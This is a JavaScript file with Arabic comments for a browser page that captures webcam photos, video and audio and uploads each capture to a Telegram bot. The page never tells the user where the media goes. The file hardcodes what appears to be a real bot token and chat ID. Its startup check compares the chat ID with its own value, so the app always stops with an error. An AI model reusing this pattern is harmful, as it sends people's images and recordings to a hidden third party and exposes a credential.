/* =================
   JavaScript Logic
   ================= */
document.addEventListener('DOMContentLoaded', () => {
    // --- ابدأ التعديل هنا ---
    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg'; // ❗️ استبدل هذا برمز البوت الخاص بك
    const CHAT_ID = '5372717005';     // ❗️ استبدل هذا بمعرف المحادثة الخاص بك
    // --- انتهى التعديل هنا ---

    // عناصر الواجهة
    const preview = document.getElementById('preview');
    const capturePhotoBtn = document.getElementById('capturePhotoBtn');
    const recordVideoBtn = document.getElementById('recordVideoBtn');
    const recordAudioBtn = document.getElementById('recordAudioBtn');
    const statusDiv = document.getElementById('status');

    let stream = null;
    let mediaRecorder = null;
    let recordingType = ''; // 'video' or 'audio'

    // طلب صلاحيات الوصول للكاميرا والميكروفون
    async function init() {
        if (!BOT_TOKEN.includes(':') || CHAT_ID === '5372717005') {
            updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
            return;
        }
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            preview.srcObject = stream;
            preview.classList.remove('hidden');
            
            // تمكين الأزرار بعد الحصول على الصلاحيات
            capturePhotoBtn.disabled = false;
            recordVideoBtn.disabled = false;
            recordAudioBtn.disabled = false;
            updateStatus('جاهز لالتقاط الوسائط', 'success');
        } catch (err) {
            console.error("خطأ في الوصول للوسائط:", err);
            updateStatus('خطأ: لم يتم منح صلاحية الوصول للكاميرا والميكروفون.', 'error');
        }
    }

    // تحديث رسالة الحالة
    function updateStatus(message, type = 'info') {
        statusDiv.textContent = message;
        statusDiv.className = 'status'; // Reset classes
        if (type === 'recording') {
            statusDiv.classList.add('recording');
        }
    }

    // دالة إرسال البيانات إلى تيليجرام
    async function sendToTelegram(formData, caption = '') {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
        
        const data = new FormData( );
        data.append('chat_id', CHAT_ID);
        data.append(formData.fileType, formData.file, formData.fileName);
        if (caption) {
            data.append('caption', caption);
        }

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: data
            });
            const result = await response.json();
            if (result.ok) {
                console.log('تم الإرسال بنجاح:', result);
                return true;
            } else {
                console.error('فشل الإرسال:', result);
                return false;
            }
        } catch (error) {
            console.error('خطأ في الشبكة:', error);
            return false;
        }
    }

    // 1. التقاط الصور
    capturePhotoBtn.addEventListener('click', async () => {
        updateStatus('جاري التقاط 5 صور...', 'info');
        capturePhotoBtn.disabled = true;

        const canvas = document.createElement('canvas');
        const videoTrack = stream.getVideoTracks()[0];
        const settings = videoTrack.getSettings();
        canvas.width = settings.width;
        canvas.height = settings.height;
        const context = canvas.getContext('2d');

        for (let i = 0; i < 5; i++) {
            updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
            context.drawImage(preview, 0, 0, canvas.width, canvas.height);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
            
            const formData = {
                method: 'sendPhoto',
                fileType: 'photo',
                file: blob,
                fileName: `capture_${Date.now()}.jpg`
            };
            await sendToTelegram(formData, `صورة رقم ${i + 1}`);
            
            // انتظار قصير بين الصور
            if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
        }

        updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
        capturePhotoBtn.disabled = false;
    });

    // 2. تسجيل الفيديو
    recordVideoBtn.addEventListener('click', () => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'video';
            startRecording(stream, 'video/webm');
            recordVideoBtn.textContent = '🛑 إيقاف تسجيل الفيديو';
            recordVideoBtn.classList.add('btn-stop');
            recordAudioBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateStatus('جاري تسجيل الفيديو...', 'recording');
        }
    });

    // 3. تسجيل الصوت
    recordAudioBtn.addEventListener('click', () => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'audio';
            const audioStream = new MediaStream(stream.getAudioTracks());
            startRecording(audioStream, 'audio/webm');
            recordAudioBtn.textContent = '🛑 إيقاف تسجيل الصوت';
            recordAudioBtn.classList.add('btn-stop');
            recordVideoBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateStatus('جاري تسجيل الصوت...', 'recording');
        }
    });

    // دالة بدء التسجيل
    function startRecording(streamToRecord, mimeType) {
        let recordedChunks = [];
        mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            let formData;
            if (recordingType === 'video') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `video_${Date.now()}.webm`
                };
                updateStatus('جاري إرسال الفيديو...', 'info');
            } else { // audio
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `audio_${Date.now()}.webm`
                };
                updateStatus('جاري إرسال الصوت...', 'info');
            }

            const success = await sendToTelegram(formData);
            if (success) {
                updateStatus('تم الإرسال بنجاح!', 'success');
            } else {
                updateStatus('حدث خطأ أثناء الإرسال.', 'error');
            }
            
            resetButtons();
        };

        mediaRecorder.start();
    }
    
    // إعادة تعيين الأزرار إلى حالتها الأصلية
    function resetButtons() {
        recordVideoBtn.textContent = '📹 تسجيل فيديو';
        recordVideoBtn.classList.remove('btn-stop');
        recordAudioBtn.textContent = '🎤 تسجيل صوت';
        recordAudioBtn.classList.remove('btn-stop');
        
        capturePhotoBtn.disabled = false;
        recordVideoBtn.disabled = false;
        recordAudioBtn.disabled = false;
    }

    // بدء تشغيل التطبيق
    init();
});
